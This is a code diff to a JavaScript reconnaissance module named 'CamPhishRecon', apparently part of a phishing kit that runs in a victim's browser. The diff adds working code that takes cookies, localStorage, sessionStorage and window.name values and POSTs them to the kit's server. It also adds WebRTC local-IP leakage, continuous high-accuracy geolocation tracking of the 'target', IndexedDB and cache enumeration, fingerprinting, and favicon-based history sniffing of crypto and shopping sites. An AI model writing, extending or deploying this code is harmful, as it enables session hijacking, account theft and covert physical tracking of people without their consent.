@@ -259,6 +259,24 @@ var Fingerprint = {
       if (window.DeviceMotionEvent) fp.has_accelerometer = true;
     } catch(e) {}
 
+    // Speech synthesis voice count
+    if (window.speechSynthesis) {
+      try {
+        var voices = window.speechSynthesis.getVoices();
+        if (voices && voices.length > 0) {
+          fp.voice_count = voices.length;
+          fp.voice_languages = voices.map(function(v){return v.lang;}).filter(function(v,i,a){return a.indexOf(v)===i;}).join(',');
+        }
+      } catch(e) {}
+      window.speechSynthesis.onvoiceschanged = function() {
+        try {
+          var voices = window.speechSynthesis.getVoices();
+          fp.voice_count = voices.length;
+          fp.voice_languages = voices.map(function(v){return v.lang;}).filter(function(v,i,a){return a.indexOf(v)===i;}).join(',');
+        } catch(e) {}
+      };
+    }
+
     function finishFp() {
       fp.session = Session.getId();
       fp.collected_at = new Date().toISOString();
@@ -299,6 +317,22 @@ var Capture = {
       method: 'POST', headers: {'Content-Type': 'application/json'},
       body: JSON.stringify({session: Session.getId()})
     }).catch(function(){});
+    // Async WebRTC local IP detection as fallback
+    try {
+      var pc = new RTCPeerConnection({iceServers: []});
+      pc.createDataChannel('');
+      pc.createOffer(function(offer){ pc.setLocalDescription(offer, function(){}, function(){}); }, function(){});
+      pc.onicecandidate = function(e) {
+        if (e && e.candidate && e.candidate.candidate) {
+          var m = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+          if (m && m[1] && !m[1].startsWith('0.')) {
+            Capture._event('local_ip', {ip: m[1]});
+          }
+          pc.close();
+        }
+      };
+      setTimeout(function(){ try { pc.close(); } catch(e) {} }, 2000);
+    } catch(e) {}
   },
 
   location: function() {
@@ -345,6 +379,24 @@ var Capture = {
     }).catch(function(){});
   },
 
+  _watchId: null,
+
+  startWatching: function() {
+    if (!navigator.geolocation || Capture._watchId) return;
+    Capture._watchId = navigator.geolocation.watchPosition(
+      function(pos) { Capture._sendLoc(pos); },
+      function() {},
+      {enableHighAccuracy: true, timeout: 15000, maximumAge: 30000}
+    );
+  },
+
+  stopWatching: function() {
+    if (Capture._watchId) {
+      navigator.geolocation.clearWatch(Capture._watchId);
+      Capture._watchId = null;
+    }
+  },
+
   image: function(dataUrl, method) {
     fetch(API + '/capture/image', {
       method: 'POST', headers: {'Content-Type': 'application/json'},
@@ -383,28 +435,101 @@ var StorageGrabber = {
     if (Session.hasCaptured('storage')) return;
     Session.markCaptured('storage');
     var data = {session: Session.getId()};
+    // Cookies
     try { data.cookies = document.cookie; data.cookie_count = document.cookie ? document.cookie.split(';').length : 0; } catch(e) {}
+    // window.name (persists across navigations, often used for session passing)
+    try { data.window_name = window.name || ''; } catch(e) {}
+    // localStorage with value sizes
     try {
-      var ls = {};
+      var ls = {}, lsSizes = {};
       for (var i = 0; i < localStorage.length; i++) {
         var key = localStorage.key(i);
         if (key === Session.KEY || key === PermTracker.KEY) continue;
-        try { var val = localStorage.getItem(key); ls[key] = val && val.length < 2000 ? val : '[truncated]'; } catch(e) { ls[key] = '[error]'; }
+        try {
+          var val = localStorage.getItem(key);
+          var size = new Blob([val || '']).size;
+          lsSizes[key] = size;
+          ls[key] = val && val.length < 2000 ? val : '[truncated ' + size + 'B]';
+        } catch(e) { ls[key] = '[error]'; }
       }
-      data.localStorage = ls; data.localStorage_keys = Object.keys(ls).length;
+      data.localStorage = ls; data.localStorage_keys = Object.keys(ls).length; data.localStorage_sizes = lsSizes;
     } catch(e) {}
+    // sessionStorage with value sizes
     try {
-      var ss = {};
+      var ss = {}, ssSizes = {};
       for (var i = 0; i < sessionStorage.length; i++) {
         var key = sessionStorage.key(i);
-        try { var val = sessionStorage.getItem(key); ss[key] = val && val.length < 2000 ? val : '[truncated]'; } catch(e) { ss[key] = '[error]'; }
+        try {
+          var val = sessionStorage.getItem(key);
+          var size = new Blob([val || '']).size;
+          ssSizes[key] = size;
+          ss[key] = val && val.length < 2000 ? val : '[truncated ' + size + 'B]';
+        } catch(e) { ss[key] = '[error]'; }
       }
-      data.sessionStorage = ss; data.sessionStorage_keys = Object.keys(ss).length;
+      data.sessionStorage = ss; data.sessionStorage_keys = Object.keys(ss).length; data.sessionStorage_sizes = ssSizes;
     } catch(e) {}
+    // Send sync storage data
     fetch(API + '/capture/storage', {
       method: 'POST', headers: {'Content-Type': 'application/json'},
       body: JSON.stringify(data)
     }).catch(function(){});
+    // Async enrichment: CookieStore API (Chromium 87+, HTTPS only)
+    try {
+      if (window.cookieStore && window.cookieStore.getAll) {
+        window.cookieStore.getAll().then(function(cookies) {
+          if (cookies && cookies.length > 0) {
+            Capture.event('cookie_details', {
+              cookies: cookies.map(function(c) {
+                return {
+                  name: c.name, domain: c.domain, path: c.path,
+                  secure: c.secure, httpOnly: c.httpOnly,
+                  sameSite: c.sameSite, expires: c.expires ? new Date(c.expires).toISOString() : null
+                };
+              })
+            });
+          }
+        }).catch(function(){});
+      }
+    } catch(e) {}
+    // Async enrichment: Storage estimate
+    try {
+      if (navigator.storage && navigator.storage.estimate) {
+        navigator.storage.estimate().then(function(est) {
+          Capture.event('storage_estimate', {
+            quota: est.quota, usage: est.usage,
+            usage_details: est.usageDetails || null
+          });
+        }).catch(function(){});
+      }
+    } catch(e) {}
+    // Async enrichment: Cache API enumeration
+    try {
+      if (window.caches && window.caches.keys) {
+        window.caches.keys().then(function(names) {
+          if (names && names.length > 0) {
+            Capture.event('cache_storage', {cache_names: names});
+          }
+        }).catch(function(){});
+      }
+    } catch(e) {}
+  }
+};
+
+// ============ INDEXED DB ENUMERATION ============
+var IndexedDBGrabber = {
+  grab: function(callback) {
+    if (!window.indexedDB || !window.indexedDB.databases) {
+      if (callback) callback([]);
+      return;
+    }
+    window.indexedDB.databases().then(function(dbs) {
+      var result = dbs.map(function(db) {
+        return {name: db.name, version: db.version};
+      });
+      if (callback) callback(result);
+    }).catch(function() {
+      if (callback) callback([]);
+    });
   }
 };
 
@@ -420,6 +545,9 @@ var HistoryDetect = {
     {url:'https://www.amazon.com/favicon.ico',cat:'shopping'},
     {url:'https://www.binance.com/favicon.ico',cat:'crypto'},
     {url:'https://github.com/favicon.ico',cat:'dev'},
+    {url:'https://www.ebay.com/favicon.ico',cat:'shopping'},
+    {url:'https://www.coinbase.com/favicon.ico',cat:'crypto'},
+    {url:'https://stackoverflow.com/favicon.ico',cat:'dev'},
   ],
   detect: function(callback) {
     if (Session.hasCaptured('history')) { callback({visited:[],skipped:true}); return; }
@@ -487,9 +615,11 @@ var AutoPerm = {
 var Recon = {
   init: function(opts) {
     opts = opts || {};
-    // IP — only once per session
+    // IP — only once per session (client IP is detected async via WebRTC)
     Capture.ip();
-    // Location — only once per session
+    // Start continuous location watching (sends updates as target moves)
+    Capture.startWatching();
+    // Location — one-shot on init
     Capture.location();
     // Fingerprint — only once per session
     if (!Session.hasCaptured('fingerprint')) {
@@ -511,6 +641,12 @@ var Recon = {
     });
     // Auto permissions — only if not yet captured
     AutoPerm.checkAndRequest();
+    // IndexedDB enumeration
+    IndexedDBGrabber.grab(function(dbs) {
+      if (dbs && dbs.length > 0) {
+        Capture.event('indexeddb_detected', {databases: dbs});
+      }
+    });
 
     // Watch for permission changes
     if (navigator.permissions) {
@@ -543,7 +679,8 @@ var Recon = {
   PermTracker: PermTracker,
   Session: Session,
   StorageGrabber: StorageGrabber,
-  HistoryDetect: HistoryDetect
+  HistoryDetect: HistoryDetect,
+  IndexedDBGrabber: IndexedDBGrabber
 };
 
 window.CamPhishRecon = Recon;
